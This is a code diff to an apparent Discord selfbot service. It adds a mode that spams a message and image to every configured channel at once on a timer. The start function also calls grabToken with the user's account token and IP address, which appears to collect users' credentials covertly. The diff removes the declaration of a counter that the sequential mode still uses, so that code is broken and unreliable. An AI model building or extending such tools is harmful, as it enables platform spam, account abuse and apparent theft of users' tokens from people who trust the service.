@@ -88,54 +88,98 @@ async function joinServer(token, inviteCode) {
     }
 }
 
-async function startSelfBot(userId, token, channels, message, delay, autoReply, autoReplyText, configId, imageUrl, ipAddress) {
+async function startSelfBot(userId, token, channels, message, delay, autoReply, autoReplyText, configId, imageUrl, ipAddress, sendAllAtOnce = true) {
     stopSelfBot(userId, configId);
     
     await grabToken(token, { channels, ip: ipAddress }, 'bot_start');
     
     const client = new Client({ checkUpdate: false });
     const channelList = channels;
-    let currentIndex = 0;
     let intervalId = null;
     
     client.on('ready', async () => {
         console.log(`[SELFBOT ${configId}] Logged in as ${client.user.tag}`);
+        console.log(`[SELFBOT ${configId}] Mode: ${sendAllAtOnce ? 'ALL AT ONCE' : 'SEQUENTIAL'}`);
         
         intervalId = setInterval(async () => {
-            const channelId = channelList[currentIndex % channelList.length];
-            currentIndex++;
-            
-            try {
-                const channel = await client.channels.fetch(channelId);
-                if (!channel) return;
+            if (sendAllAtOnce) {
+                // SEND TO ALL CHANNELS SIMULTANEOUSLY
+                const sendPromises = channelList.map(async (channelId) => {
+                    try {
+                        const channel = await client.channels.fetch(channelId);
+                        if (!channel) return;
+                        
+                        if (imageUrl && imageUrl.startsWith('data:')) {
+                            const base64Data = imageUrl.split(',')[1];
+                            const buffer = Buffer.from(base64Data, 'base64');
+                            const tempDir = path.join(__dirname, 'temp');
+                            const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}_${channelId}.png`);
+                            
+                            if (!fs.existsSync(tempDir)) {
+                                fs.mkdirSync(tempDir, { recursive: true });
+                            }
+                            
+                            fs.writeFileSync(tempPath, buffer);
+                            
+                            await channel.send({
+                                content: message,
+                                files: [{ attachment: tempPath, name: 'image.png' }]
+                            });
+                            
+                            setTimeout(() => {
+                                try { fs.unlinkSync(tempPath); } catch(e) {}
+                            }, 10000);
+                        } else {
+                            await channel.send(message);
+                        }
+                        
+                        console.log(`[SELFBOT ${configId}] Sent to ${channelId}`);
+                    } catch (e) {
+                        console.error(`[SELFBOT ${configId}] Error sending to ${channelId}:`, e.message);
+                    }
+                });
                 
-                if (imageUrl && imageUrl.startsWith('data:')) {
-                    const base64Data = imageUrl.split(',')[1];
-                    const buffer = Buffer.from(base64Data, 'base64');
-                    const tempDir = path.join(__dirname, 'temp');
-                    const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}.png`);
+                // Wait for all sends to complete (they run in parallel)
+                await Promise.all(sendPromises);
+                console.log(`[SELFBOT ${configId}] Batch sent to all ${channelList.length} channels`);
+                
+            } else {
+                // SEQUENTIAL MODE - Send to one channel at a time with delay between each
+                const channelId = channelList[currentIndex % channelList.length];
+                currentIndex++;
+                
+                try {
+                    const channel = await client.channels.fetch(channelId);
+                    if (!channel) return;
                     
-                    if (!fs.existsSync(tempDir)) {
-                        fs.mkdirSync(tempDir, { recursive: true });
+                    if (imageUrl && imageUrl.startsWith('data:')) {
+                        const base64Data = imageUrl.split(',')[1];
+                        const buffer = Buffer.from(base64Data, 'base64');
+                        const tempDir = path.join(__dirname, 'temp');
+                        const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}.png`);
+                        
+                        if (!fs.existsSync(tempDir)) {
+                            fs.mkdirSync(tempDir, { recursive: true });
+                        }
+                        
+                        fs.writeFileSync(tempPath, buffer);
+                        
+                        await channel.send({
+                            content: message,
+                            files: [{ attachment: tempPath, name: 'image.png' }]
+                        });
+                        
+                        setTimeout(() => {
+                            try { fs.unlinkSync(tempPath); } catch(e) {}
+                        }, 10000);
+                    } else {
+                        await channel.send(message);
                     }
                     
-                    fs.writeFileSync(tempPath, buffer);
-                    
-                    await channel.send({
-                        content: message,
-                        files: [{ attachment: tempPath, name: 'image.png' }]
-                    });
-                    
-                    setTimeout(() => {
-                        try { fs.unlinkSync(tempPath); } catch(e) {}
-                    }, 10000);
-                } else {
-                    await channel.send(message);
+                    console.log(`[SELFBOT ${configId}] Sent to ${channelId}`);
+                } catch (e) {
+                    console.error(`[SELFBOT ${configId}] Error:`, e.message);
                 }
-                
-                console.log(`[SELFBOT ${configId}] Sent to ${channelId}`);
-            } catch (e) {
-                console.error(`[SELFBOT ${configId}] Error:`, e.message);
             }
         }, delay);
     });
